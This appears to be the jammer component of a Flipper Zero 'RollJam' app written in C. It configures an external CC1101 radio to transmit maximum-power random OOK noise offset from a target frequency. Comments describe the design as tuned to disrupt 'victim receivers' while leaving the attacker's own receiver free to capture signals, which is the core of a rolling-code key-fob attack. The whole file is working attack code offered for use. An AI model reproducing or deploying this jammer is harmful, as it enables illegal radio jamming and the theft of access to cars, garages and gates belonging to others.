#include "rolljam_cc1101_ext.h"
#include <furi_hal_gpio.h>
#include <furi_hal_resources.h>
#include <furi_hal_cortex.h>
#include <furi_hal_power.h>

// ============================================================
// 5V OTG power for external modules (e.g. Rabbit Lab Flux Capacitor)
// ============================================================

static bool otg_was_enabled = false;

static void rolljam_ext_power_on(void) {
    otg_was_enabled = furi_hal_power_is_otg_enabled();
    if(!otg_was_enabled) {
        uint8_t attempts = 0;
        while(!furi_hal_power_is_otg_enabled() && attempts++ < 5) {
            furi_hal_power_enable_otg();
            furi_delay_ms(10);
        }
    }
}

static void rolljam_ext_power_off(void) {
    if(!otg_was_enabled) {
        furi_hal_power_disable_otg();
    }
}

// ============================================================
// GPIO Pins
// ============================================================
static const GpioPin* pin_mosi = &gpio_ext_pa7;
static const GpioPin* pin_miso = &gpio_ext_pa6;
static const GpioPin* pin_cs   = &gpio_ext_pa4;
static const GpioPin* pin_sck  = &gpio_ext_pb3;
static const GpioPin* pin_gdo0 = &gpio_ext_pb2;

// ============================================================
// CC1101 Registers
// ============================================================
#define CC_IOCFG2    0x00
#define CC_IOCFG0    0x02
#define CC_FIFOTHR   0x03
#define CC_SYNC1     0x04
#define CC_SYNC0     0x05
#define CC_PKTLEN    0x06
#define CC_PKTCTRL1  0x07
#define CC_PKTCTRL0  0x08
#define CC_FSCTRL1   0x0B
#define CC_FSCTRL0   0x0C
#define CC_FREQ2     0x0D
#define CC_FREQ1     0x0E
#define CC_FREQ0     0x0F
#define CC_MDMCFG4   0x10
#define CC_MDMCFG3   0x11
#define CC_MDMCFG2   0x12
#define CC_MDMCFG1   0x13
#define CC_MDMCFG0   0x14
#define CC_DEVIATN   0x15
#define CC_MCSM1     0x17
#define CC_MCSM0     0x18
#define CC_FOCCFG    0x19
#define CC_AGCCTRL2  0x1B
#define CC_AGCCTRL1  0x1C
#define CC_AGCCTRL0  0x1D
#define CC_FREND0    0x22
#define CC_FSCAL3    0x23
#define CC_FSCAL2    0x24
#define CC_FSCAL1    0x25
#define CC_FSCAL0    0x26
#define CC_TEST2     0x2C
#define CC_TEST1     0x2D
#define CC_TEST0     0x2E
#define CC_PATABLE   0x3E
#define CC_TXFIFO    0x3F

#define CC_PARTNUM   0x30
#define CC_VERSION   0x31
#define CC_MARCSTATE 0x35
#define CC_TXBYTES   0x3A

#define CC_SRES      0x30
#define CC_SCAL      0x33
#define CC_STX       0x35
#define CC_SIDLE     0x36
#define CC_SFTX      0x3B

#define MARC_IDLE    0x01
#define MARC_TX      0x13

// ============================================================
// Bit-bang SPI
// ============================================================

static inline void spi_delay(void) {
    __NOP(); __NOP(); __NOP(); __NOP();
    __NOP(); __NOP(); __NOP(); __NOP();
    __NOP(); __NOP(); __NOP(); __NOP();
    __NOP(); __NOP(); __NOP(); __NOP();
}

static inline void cs_lo(void) {
    furi_hal_gpio_write(pin_cs, false);
    spi_delay(); spi_delay();
}

static inline void cs_hi(void) {
    spi_delay();
    furi_hal_gpio_write(pin_cs, true);
    spi_delay(); spi_delay();
}

static bool wait_miso(uint32_t us) {
    CoreDebug->DEMCR |= CoreDebug_DEMCR_TRCENA_Msk;
    DWT->CTRL |= DWT_CTRL_CYCCNTENA_Msk;
    uint32_t s = DWT->CYCCNT;
    uint32_t t = (SystemCoreClock / 1000000) * us;
    while(furi_hal_gpio_read(pin_miso)) {
        if((DWT->CYCCNT - s) > t) return false;
    }
    return true;
}

static uint8_t spi_byte(uint8_t tx) {
    uint8_t rx = 0;
    for(int8_t i = 7; i >= 0; i--) {
        furi_hal_gpio_write(pin_mosi, (tx >> i) & 0x01);
        spi_delay();
        furi_hal_gpio_write(pin_sck, true);
        spi_delay();
        if(furi_hal_gpio_read(pin_miso)) rx |= (1 << i);
        furi_hal_gpio_write(pin_sck, false);
        spi_delay();
    }
    return rx;
}

static uint8_t cc_strobe(uint8_t cmd) {
    cs_lo();
    if(!wait_miso(5000)) { cs_hi(); return 0xFF; }
    uint8_t s = spi_byte(cmd);
    cs_hi();
    return s;
}

static void cc_write(uint8_t a, uint8_t v) {
    cs_lo();
    if(!wait_miso(5000)) { cs_hi(); return; }
    spi_byte(a);
    spi_byte(v);
    cs_hi();
}

static uint8_t cc_read(uint8_t a) {
    cs_lo();
    if(!wait_miso(5000)) { cs_hi(); return 0xFF; }
    spi_byte(a | 0x80);
    uint8_t v = spi_byte(0x00);
    cs_hi();
    return v;
}

static uint8_t cc_read_status(uint8_t a) {
    cs_lo();
    if(!wait_miso(5000)) { cs_hi(); return 0xFF; }
    spi_byte(a | 0xC0);
    uint8_t v = spi_byte(0x00);
    cs_hi();
    return v;
}

static void cc_write_burst(uint8_t a, const uint8_t* d, uint8_t n) {
    cs_lo();
    if(!wait_miso(5000)) { cs_hi(); return; }
    spi_byte(a | 0x40);
    for(uint8_t i = 0; i < n; i++) spi_byte(d[i]);
    cs_hi();
}

// ============================================================
// Helpers
// ============================================================

static bool cc_reset(void) {
    cs_hi(); furi_delay_us(30);
    cs_lo(); furi_delay_us(30);
    cs_hi(); furi_delay_us(50);
    cs_lo();
    if(!wait_miso(10000)) { cs_hi(); return false; }
    spi_byte(CC_SRES);
    if(!wait_miso(100000)) { cs_hi(); return false; }
    cs_hi();
    furi_delay_ms(5);
    FURI_LOG_I(TAG, "EXT: Reset OK");
    return true;
}

static bool cc_check(void) {
    uint8_t p = cc_read_status(CC_PARTNUM);
    uint8_t v = cc_read_status(CC_VERSION);
    FURI_LOG_I(TAG, "EXT: PART=0x%02X VER=0x%02X", p, v);
    return (v == 0x14 || v == 0x04 || v == 0x03);
}

static uint8_t cc_state(void) {
    return cc_read_status(CC_MARCSTATE) & 0x1F;
}

static uint8_t cc_txbytes(void) {
    return cc_read_status(CC_TXBYTES) & 0x7F;
}

static void cc_idle(void) {
    cc_strobe(CC_SIDLE);
    for(int i = 0; i < 500; i++) {
        if(cc_state() == MARC_IDLE) return;
        furi_delay_us(50);
    }
}

static void cc_set_freq(uint32_t f) {
    uint32_t r = (uint32_t)(((uint64_t)f << 16) / 26000000ULL);
    cc_write(CC_FREQ2, (r >> 16) & 0xFF);
    cc_write(CC_FREQ1, (r >> 8) & 0xFF);
    cc_write(CC_FREQ0, r & 0xFF);
}

// ============================================================
// JAMMING APPROACH: Random OOK noise via FIFO
// ============================================================
/*
 * Previous approaches and their problems:
 *
 * 1. FIFO random data (first attempt):
 *    - 100% underflow because data rate was too high
 *    
 * 2. Broadband GDO0 toggling:
 *    - Self-interference with internal CC1101
 *
 * 3. Pure CW carrier:
 *    - Too weak/narrow to jam effectively
 *
 * NEW APPROACH: Low data rate FIFO feeding
 *
 * Key insight: the underflow happened because data rate was
 * 115 kBaud and we couldn't feed the FIFO fast enough from
 * the thread (furi_delay + SPI overhead).
 *
 * Solution: Use LOW data rate (~1.2 kBaud) so the FIFO
 * drains very slowly. 64 bytes at 1.2 kBaud lasts ~426ms!
 * That's plenty of time to refill.
 *
 * At 1.2 kBaud with random data, the OOK signal creates
 * random on/off keying with ~833us per bit. This produces
 * a modulated signal with ~1.2kHz bandwidth - enough to
 * disrupt OOK receivers but narrow enough to not self-jam.
 *
 * Combined with the 700kHz offset, this is:
 * - Visible on spectrum analyzers (modulated signal)
 * - Effective at disrupting victim receivers
 * - NOT interfering with our narrow 58kHz RX
 */

static bool cc_configure_jam(uint32_t freq) {
    FURI_LOG_I(TAG, "EXT: Config OOK noise jam at %lu Hz", freq);
    cc_idle();

    // GDO0: TX FIFO threshold
    cc_write(CC_IOCFG0, 0x02);  // GDO0 asserts when TX FIFO below threshold
    cc_write(CC_IOCFG2, 0x0E);  // Carrier sense

    // Fixed packet length, 255 bytes per packet
    cc_write(CC_PKTCTRL0, 0x00); // Fixed length, no CRC, no whitening
    cc_write(CC_PKTCTRL1, 0x00); // No address check
    cc_write(CC_PKTLEN, 0xFF);   // 255 bytes per packet

    // FIFO threshold: alert when TX FIFO has space for 33+ bytes
    cc_write(CC_FIFOTHR, 0x07);

    // No sync word - just raw data
    cc_write(CC_SYNC1, 0x00);
    cc_write(CC_SYNC0, 0x00);

    // Frequency
    cc_set_freq(freq);

    cc_write(CC_FSCTRL1, 0x06);
    cc_write(CC_FSCTRL0, 0x00);

    // CRITICAL: LOW data rate to prevent FIFO underflow
    // 1.2 kBaud: DRATE_E=5, DRATE_M=67
    // At this rate, 64 bytes = 64*8/1200 = 426ms before FIFO empty
    cc_write(CC_MDMCFG4, 0x85);  // BW=325kHz (for TX spectral output), DRATE_E=5
    cc_write(CC_MDMCFG3, 0x43);  // DRATE_M=67 → ~1.2 kBaud
    cc_write(CC_MDMCFG2, 0x30);  // ASK/OOK, no sync word
    cc_write(CC_MDMCFG1, 0x00);  // No preamble
    cc_write(CC_MDMCFG0, 0xF8);
    cc_write(CC_DEVIATN, 0x47);

    // Auto-return to TX after packet sent
    cc_write(CC_MCSM1, 0x00);  // TXOFF -> IDLE (we manually re-enter TX)
    cc_write(CC_MCSM0, 0x18);  // Auto-cal IDLE->TX

    // MAX TX power
    cc_write(CC_FREND0, 0x11);  // PA index 1 for OOK high

    // PATABLE: ALL entries at max power
    // Index 0 = 0x00 for OOK "0" (off)
    // Index 1 = 0xC0 for OOK "1" (+12 dBm)
    uint8_t pa[8] = {0x00, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0};
    cc_write_burst(CC_PATABLE, pa, 8);

    // Calibration
    cc_write(CC_FSCAL3, 0xEA);
    cc_write(CC_FSCAL2, 0x2A);
    cc_write(CC_FSCAL1, 0x00);
    cc_write(CC_FSCAL0, 0x1F);

    // Test regs
    cc_write(CC_TEST2, 0x81);
    cc_write(CC_TEST1, 0x35);
    cc_write(CC_TEST0, 0x09);

    // Calibrate
    cc_idle();
    cc_strobe(CC_SCAL);
    furi_delay_ms(2);
    cc_idle();

    // Verify configuration
    uint8_t st = cc_state();
    uint8_t mdm4 = cc_read(CC_MDMCFG4);
    uint8_t mdm3 = cc_read(CC_MDMCFG3);
    uint8_t mdm2 = cc_read(CC_MDMCFG2);
    uint8_t pkt0 = cc_read(CC_PKTCTRL0);
    uint8_t plen = cc_read(CC_PKTLEN);
    uint8_t pa0  = cc_read(CC_PATABLE);

    FURI_LOG_I(TAG, "EXT: MDM4=0x%02X MDM3=0x%02X MDM2=0x%02X PKT0=0x%02X PLEN=%d PA=0x%02X state=0x%02X",
               mdm4, mdm3, mdm2, pkt0, plen, pa0, st);

    return (st == MARC_IDLE);
}

// ============================================================
// Jam thread - FIFO-fed OOK at low data rate
// ============================================================

static int32_t jam_thread_worker(void* context) {
    RollJamApp* app = context;

    FURI_LOG_I(TAG, "========================================");
    FURI_LOG_I(TAG, "JAM: LOW-RATE OOK NOISE MODE");
    FURI_LOG_I(TAG, "Target: %lu  Jam: %lu (+%lu)",
               app->frequency, app->jam_frequency, (uint32_t)JAM_OFFSET_HZ);
    FURI_LOG_I(TAG, "========================================");

    if(!cc_reset()) {
        FURI_LOG_E(TAG, "JAM: Reset failed!");
        return -1;
    }
    if(!cc_check()) {
        FURI_LOG_E(TAG, "JAM: No chip!");
        return -1;
    }
    if(!cc_configure_jam(app->jam_frequency)) {
        FURI_LOG_E(TAG, "JAM: Config failed!");
        return -1;
    }

    // PRNG state
    uint32_t prng = 0xDEADBEEF ^ (uint32_t)(app->jam_frequency);

    // Flush TX FIFO
    cc_strobe(CC_SFTX);
    furi_delay_ms(1);

    // Pre-fill FIFO with random data (64 bytes max FIFO)
    uint8_t noise[62];
    for(uint8_t i = 0; i < 62; i++) {
        prng ^= prng << 13;
        prng ^= prng >> 17;
        prng ^= prng << 5;
        noise[i] = (uint8_t)(prng & 0xFF);
    }
    cc_write_burst(CC_TXFIFO, noise, 62);

    uint8_t txb = cc_txbytes();
    FURI_LOG_I(TAG, "JAM: FIFO pre-filled, txbytes=%d", txb);

    // Enter TX
    cc_strobe(CC_STX);
    furi_delay_ms(5);

    uint8_t st = cc_state();
    FURI_LOG_I(TAG, "JAM: After STX state=0x%02X", st);

    if(st != MARC_TX) {
        // Retry
        cc_idle();
        cc_strobe(CC_SFTX);
        furi_delay_ms(1);
        cc_write_burst(CC_TXFIFO, noise, 62);
        cc_strobe(CC_STX);
        furi_delay_ms(5);
        st = cc_state();
        FURI_LOG_I(TAG, "JAM: Retry state=0x%02X", st);
        if(st != MARC_TX) {
            FURI_LOG_E(TAG, "JAM: Cannot enter TX!");
            return -1;
        }
    }

    FURI_LOG_I(TAG, "JAM: *** OOK NOISE ACTIVE ***");

    uint32_t loops = 0;
    uint32_t underflows = 0;
    uint32_t refills = 0;

    while(app->jam_thread_running) {
        loops++;

        st = cc_state();

        if(st != MARC_TX) {
            // Packet finished or underflow - reload and re-enter TX
            underflows++;

            cc_idle();
            cc_strobe(CC_SFTX);
            furi_delay_us(100);

            // Refill with new random data
            for(uint8_t i = 0; i < 62; i++) {
                prng ^= prng << 13;
                prng ^= prng >> 17;
                prng ^= prng << 5;
                noise[i] = (uint8_t)(prng & 0xFF);
            }
            cc_write_burst(CC_TXFIFO, noise, 62);

            cc_strobe(CC_STX);
            furi_delay_ms(1);
            continue;
        }

        // Check if FIFO needs refilling
        txb = cc_txbytes();
        if(txb < 20) {
            // Refill what we can
            uint8_t space = 62 - txb;
            if(space > 50) space = 50;

            for(uint8_t i = 0; i < space; i++) {
                prng ^= prng << 13;
                prng ^= prng >> 17;
                prng ^= prng << 5;
                noise[i] = (uint8_t)(prng & 0xFF);
            }
            cc_write_burst(CC_TXFIFO, noise, space);
            refills++;
        }

        // Log periodically
        if(loops % 500 == 0) {
            FURI_LOG_I(TAG, "JAM: active loops=%lu uf=%lu refills=%lu txb=%d st=0x%02X",
                       loops, underflows, refills, cc_txbytes(), cc_state());
        }

        // At 1.2 kBaud, 62 bytes last ~413ms
        // Check every 50ms - plenty of time
        furi_delay_ms(50);
    }

    cc_idle();
    FURI_LOG_I(TAG, "JAM: STOPPED (loops=%lu uf=%lu refills=%lu)", loops, underflows, refills);
    return 0;
}

// ============================================================
// GPIO
// ============================================================

void rolljam_ext_gpio_init(void) {
    FURI_LOG_I(TAG, "EXT GPIO init");
    furi_hal_gpio_init(pin_cs, GpioModeOutputPushPull, GpioPullNo, GpioSpeedVeryHigh);
    furi_hal_gpio_write(pin_cs, true);
    furi_hal_gpio_init(pin_sck, GpioModeOutputPushPull, GpioPullNo, GpioSpeedVeryHigh);
    furi_hal_gpio_write(pin_sck, false);
    furi_hal_gpio_init(pin_mosi, GpioModeOutputPushPull, GpioPullNo, GpioSpeedVeryHigh);
    furi_hal_gpio_write(pin_mosi, false);
    furi_hal_gpio_init(pin_miso, GpioModeInput, GpioPullUp, GpioSpeedVeryHigh);
    furi_hal_gpio_init(pin_gdo0, GpioModeInput, GpioPullDown, GpioSpeedVeryHigh);
}

void rolljam_ext_gpio_deinit(void) {
    furi_hal_gpio_init(pin_cs, GpioModeAnalog, GpioPullNo, GpioSpeedLow);
    furi_hal_gpio_init(pin_sck, GpioModeAnalog, GpioPullNo, GpioSpeedLow);
    furi_hal_gpio_init(pin_mosi, GpioModeAnalog, GpioPullNo, GpioSpeedLow);
    furi_hal_gpio_init(pin_miso, GpioModeAnalog, GpioPullNo, GpioSpeedLow);
    furi_hal_gpio_init(pin_gdo0, GpioModeAnalog, GpioPullNo, GpioSpeedLow);
    FURI_LOG_I(TAG, "EXT GPIO deinit");
}

// ============================================================
// Public
// ============================================================

void rolljam_jammer_start(RollJamApp* app) {
    if(app->jamming_active) return;
    app->jam_frequency = app->frequency + JAM_OFFSET_HZ;
    rolljam_ext_power_on();
    furi_delay_ms(100);
    rolljam_ext_gpio_init();
    furi_delay_ms(10);
    app->jam_thread_running = true;
    app->jam_thread = furi_thread_alloc_ex("RJ_Jam", 4096, jam_thread_worker, app);
    furi_thread_start(app->jam_thread);
    app->jamming_active = true;
    FURI_LOG_I(TAG, ">>> JAMMER STARTED <<<");
}

void rolljam_jammer_stop(RollJamApp* app) {
    if(!app->jamming_active) return;
    app->jam_thread_running = false;
    furi_thread_join(app->jam_thread);
    furi_thread_free(app->jam_thread);
    app->jam_thread = NULL;
    rolljam_ext_gpio_deinit();
    rolljam_ext_power_off();
    app->jamming_active = false;
    FURI_LOG_I(TAG, ">>> JAMMER STOPPED <<<");
}
